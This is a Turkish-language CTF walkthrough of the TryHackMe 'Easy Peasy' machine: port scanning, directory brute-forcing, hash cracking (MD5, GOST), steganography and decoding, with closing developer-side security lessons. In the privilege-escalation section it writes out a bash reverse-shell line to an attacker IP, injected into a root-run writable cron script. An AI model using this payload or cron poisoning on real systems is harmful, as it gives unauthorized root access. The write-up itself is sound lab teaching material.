# TryHackMe: Easy Peasy — GOST Hash, Steganografi ve Cron Job ile Root

Siber güvenlik tarafına geçiş yapan bir yazılımcıyım. Bu makine ilk bakışta "easy" dese de, GOST hash, steganografi, binary decode ve cron job privesc gibi teknikleri bir araya getiren kapsamlı bir CTF.

## Keşif

Nmap ile tüm portları taradım bu kritik, çünkü standart 1000 port taraması bu makinenin giriş kapılarını kaçırırdı:

```
nmap -sC -sV -Pn -T4 -p- HEDEF_IP
```

Üç port buldum:

- **80** — nginx 1.16.1 (standart web sunucusu)
- **6498** — OpenSSH 7.6p1 (normalde 22'de olması gereken SSH!)
- **65524** — Apache 2.4.43 (ikinci web sunucusu, çok yüksek portta)

SSH'ın 6498'e taşınması "security through obscurity" amatör tarayıcıları engeller ama `-p-` ile anında yakalanır.

## Port 80 — Recursive Dizin Taraması

Nginx ana sayfası standart "Welcome" sayfasıydı. Gobuster ile taradım:

```
gobuster dir -u http://HEDEF_IP/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40
```

`/hidden` bulundu. İçinde sadece bir resim vardı. Çoğu kişi burada durur ama ben bulunan dizinin içini de taradım (recursive):

```
gobuster dir -u http://HEDEF_IP/hidden -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40
```

`/hidden/whatever/` çıktı. Kaynak kodda:

```html
<p hidden>ZmxhZ3tmMXJzN19mbDRnfQ==</p>
```

`hidden` attribute sadece tarayıcıda gizler, veri hala oradadır. `==` padding'i Base64 olduğunu gösteriyor. Decode → **Flag 1**.

## Port 65524 — Robots.txt ve Base62

Apache sunucusunun `robots.txt` dosyasında ilginç bir User-Agent vardı:

```
User-Agent: a18672860d0510e5ab6699730763b250
```

32 karakter hex = MD5 hash. Online rainbow table ile kırınca **Flag 2** çıktı.

Sayfa kaynağında **Flag 3** doğrudan bulundu. Ayrıca gizli bir `<p>` etiketi vardı:

```
its encoded with ba....: ObsJmP173N2X6dOrAgEAL0Vu
```

İpucu "ba..." diyor. Karakter setine bakınca (0-9, a-z, A-Z, `+` ve `/` yok) bu Base62. Decode → `/n0th1ng3ls3m4tt3r`.

## GOST Hash Kırma — Bu CTF'in En Kritik Dersi

`/n0th1ng3ls3m4tt3r` sayfasının kaynağında 64 karakterlik bir hash vardı. İlk refleks "SHA-256" demek ama **yanılırsın**.

```
hashid HASH_DEGERI
```

64 karakter (256-bit) üreten birden fazla algoritma var: SHA-256, GOST, RIPEMD-256, Haval-256. SHA-256 olarak kırmayı denedim, başarısız oldu. CTF dünyasında SHA-256 değilse, 256-bit'lik en popüler alternatif **GOST R 34.11-94** (Rus standardı).

```
john --format=gost --wordlist=easypeasy.txt hash.txt
```

Sonuç: `mypasswordforthatjob`. Bu bilgi bir sonraki aşamanın anahtarı.

## Steganografi — Resmin İçindeki Sır

Aynı sayfada `binarycodepixabay.jpg` adında bir görsel vardı. İndirip steghide ile gizli veriyi çıkardım:

```
steghide extract -sf binarycodepixabay.jpg
```

Passphrase olarak GOST hash'ten kırdığım `mypasswordforthatjob` kullandım. `secrettext.txt` çıktı:

```
username: boring
password: 01101001 01100011 01101111 01101110 01110110 ...
```

Parola binary (ikili) kodda yazılmış. Her 8-bit grup bir ASCII karaktere karşılık gelir. Decode ettim → `iconvertedmypasswordtobinary`.

## SSH ve User Flag

Nmap'ten hatırla: SSH port 6498'de. Standart `ssh` komutu bağlanmaz, portu belirtmek gerekir:

```
ssh boring@HEDEF_IP -p 6498
```

`user.txt` dosyasında flag vardı ama ROT13 ile encode edilmişti ("Rotated" ipucunu veriyordu). Her harfi 13 pozisyon kaydıran basit bir şifreleme:

```
echo 'ROT13_TEXT' | tr 'a-zA-Z' 'n-za-mN-ZA-M'
```

**User Flag** alındı.

## Privilege Escalation — Cron Job Zehirleme

Crontab'ı kontrol ettim:

```
cat /etc/crontab
```

Kritik satır:

```
* * * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh
```

Root, **her dakika** bu script'i çalıştırıyor. Dosyanın izinlerini kontrol ettim:

```
ls -la /var/www/.mysecretcronjob.sh
→ -rwxr-xr-x 1 boring boring
```

Dosyanın sahibi `boring` — yani ben! Script'in içeriğini reverse shell payload ile değiştirdim:

```bash
echo '/bin/bash -i >& /dev/tcp/KALI_IP/4444 0>&1' > /var/www/.mysecretcronjob.sh
```

Kali'de listener açtım:

```
nc -lvnp 4444
```

Bir dakika içinde root shell düştü. `/root/.root.txt` → **Root Flag**.

## Kapanış ve Geliştirici Gözünden

Bu makine tek bir teknikle değil, birden fazla disiplinin birleşimiyle çözülüyor. Bir yazılımcı olarak her aşamadaki güvenlik hatalarına bakmak istiyorum:

- **HTML `hidden` attribute:** Veriyi sadece görsel olarak gizler, kaynak kodda hala okunabilir. Hassas veri backend'de tutulmalı, client'a hiç gönderilmemeli.
- **Robots.txt'e hash koyma:** Robots.txt herkese açık bir dosya. Credential veya hash gibi bilgiler burada olmamalı. Secret management (environment variables, HashiCorp Vault) kullanılmalı.
- **Encoding ≠ Encryption:** Binary'ye çevirmek şifreleme değil, encoding. Geri dönüşümlü, anahtar gerektirmez. Gerçek şifreleme (AES, bcrypt) kullanılmalı.
- **Cron job dosya izinleri:** Root'un çalıştırdığı script'ler `root:root` sahipliğinde ve `chmod 700` olmalı. Düşük yetkili bir kullanıcının yazabildiği dosyayı root olarak çalıştırmak = root shell vermek.
- **SSH port değiştirmek güvenlik DEĞİL:** `-p-` taramasıyla tüm portlar bulunur. Gerçek güvenlik: key-based authentication, fail2ban, firewall kuralları.
